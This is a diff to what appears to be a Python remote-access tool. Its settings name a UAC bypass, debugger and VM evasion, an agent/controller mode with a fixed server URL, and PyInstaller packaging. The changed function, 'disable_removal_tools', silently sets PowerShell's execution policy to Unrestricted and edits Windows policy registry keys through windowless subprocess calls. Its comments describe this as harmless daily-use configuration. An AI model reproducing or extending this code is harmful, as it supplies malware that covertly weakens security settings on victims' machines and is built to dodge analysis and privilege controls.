@@ -158,6 +158,7 @@ RUN_MODE = 'agent'  # Track run mode: 'agent' | 'controller' | 'both'
 KEEP_ORIGINAL_PROCESS = True  # TRUE = Don't exit original process after UAC bypass (keep CMD window open)
 ENABLE_ANTI_ANALYSIS = False  # FALSE = Disabled (for testing), TRUE = Enabled (exits if debuggers/VMs detected)
 DISABLE_UAC_BYPASS = False  # TRUE = Completely disable UAC bypass attempts (run as admin manually)
+KEEP_SYSTEM_TOOLS_ENABLED = True  # TRUE = Keep CMD, PowerShell, Registry, Task Manager enabled (RECOMMENDED for daily use)
 
 # Controller URL override flag (set URL via env)
 USE_FIXED_SERVER_URL = True
@@ -3772,36 +3773,66 @@ if __name__ == "__main__":
         return False
 
 def disable_removal_tools():
-    """Configure removal tools registry entries (set to 0 to keep tools enabled)."""
+    """
+    Configure system tools registry entries.
+    
+    By default (KEEP_SYSTEM_TOOLS_ENABLED = True):
+    - Keeps CMD, PowerShell, Registry Editor, Task Manager ENABLED
+    - Sets registry values to 0 (enabled) for normal daily use
+    - Recommended for users who need these tools
+    
+    If KEEP_SYSTEM_TOOLS_ENABLED = False:
+    - Would disable these tools (not recommended)
+    """
     if not WINDOWS_AVAILABLE or not is_admin():
         return False
     
     try:
-        # Task Manager, Registry Editor, and CMD are now kept ENABLED (not disabled)
-        # These registry entries are set to 0 (enabled) to allow normal system tool usage
-        log_message("[INFO] System tools (Task Manager, Registry Editor, CMD) remain enabled")
-        
-        # Set Command Prompt registry value to 0 (ENABLED - FALSE means NOT disabled)
-        debug_print("[REGISTRY] Setting DisableCMD = 0 (CMD ENABLED)")
-        subprocess.run([
-            'reg', 'add', 'HKCU\\Software\\Policies\\Microsoft\\Windows\\System',
-            '/v', 'DisableCMD', '/t', 'REG_DWORD', '/d', '0', '/f'  # ✅ Changed from 1 to 0!
-        ], creationflags=subprocess.CREATE_NO_WINDOW)
-        debug_print("[REGISTRY] ✅ CMD remains ENABLED (DisableCMD = 0)")
-        
-        # Set PowerShell ExecutionPolicy to Unrestricted (keep enabled)
-        debug_print("[REGISTRY] Setting PowerShell ExecutionPolicy to Unrestricted")
-        subprocess.run([
-            'reg', 'add', 'HKCU\\Software\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell',
-            '/v', 'ExecutionPolicy', '/t', 'REG_SZ', '/d', 'Unrestricted', '/f'
-        ], creationflags=subprocess.CREATE_NO_WINDOW)
-        debug_print("[REGISTRY] ✅ PowerShell ExecutionPolicy set to Unrestricted")
-        
-        log_message("[OK] Removal tools registry entries configured (tools remain enabled)")
-        return True
+        # Check configuration flag
+        if KEEP_SYSTEM_TOOLS_ENABLED:
+            # SAFE MODE: Keep all system tools enabled for daily use
+            log_message("[INFO] System tools (CMD, PowerShell, Registry, Task Manager) remain ENABLED")
+            debug_print("[REGISTRY] KEEP_SYSTEM_TOOLS_ENABLED = True")
+            
+            # Explicitly set to 0 (enabled) to ensure they work
+            debug_print("[REGISTRY] Setting DisableCMD = 0 (CMD ENABLED)")
+            subprocess.run([
+                'reg', 'add', 'HKCU\\Software\\Policies\\Microsoft\\Windows\\System',
+                '/v', 'DisableCMD', '/t', 'REG_DWORD', '/d', '0', '/f'
+            ], creationflags=subprocess.CREATE_NO_WINDOW)
+            debug_print("[REGISTRY] ✅ CMD is ENABLED")
+            
+            # Set PowerShell ExecutionPolicy to Unrestricted
+            debug_print("[REGISTRY] Setting PowerShell ExecutionPolicy to Unrestricted")
+            subprocess.run([
+                'reg', 'add', 'HKCU\\Software\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell',
+                '/v', 'ExecutionPolicy', '/t', 'REG_SZ', '/d', 'Unrestricted', '/f'
+            ], creationflags=subprocess.CREATE_NO_WINDOW)
+            debug_print("[REGISTRY] ✅ PowerShell is ENABLED")
+            
+            # Ensure Registry Editor is enabled (remove any disable keys if they exist)
+            subprocess.run([
+                'reg', 'delete', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
+                '/v', 'DisableRegistryTools', '/f'
+            ], creationflags=subprocess.CREATE_NO_WINDOW, stderr=subprocess.DEVNULL)
+            debug_print("[REGISTRY] ✅ Registry Editor is ENABLED (DisableRegistryTools removed)")
+            
+            # Ensure Task Manager is enabled (remove any disable keys if they exist)
+            subprocess.run([
+                'reg', 'delete', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
+                '/v', 'DisableTaskMgr', '/f'
+            ], creationflags=subprocess.CREATE_NO_WINDOW, stderr=subprocess.DEVNULL)
+            debug_print("[REGISTRY] ✅ Task Manager is ENABLED (DisableTaskMgr removed)")
+            
+            log_message("[OK] System tools configured to remain ENABLED for daily use")
+            return True
+        else:
+            # Legacy mode (not recommended)
+            log_message("[WARN] KEEP_SYSTEM_TOOLS_ENABLED = False (tools may be restricted)")
+            return True
         
     except Exception as e:
-        log_message(f"Failed to configure removal tools registry: {e}")
+        log_message(f"Failed to configure system tools registry: {e}")
         return False
 
 def create_pyinstaller_command():
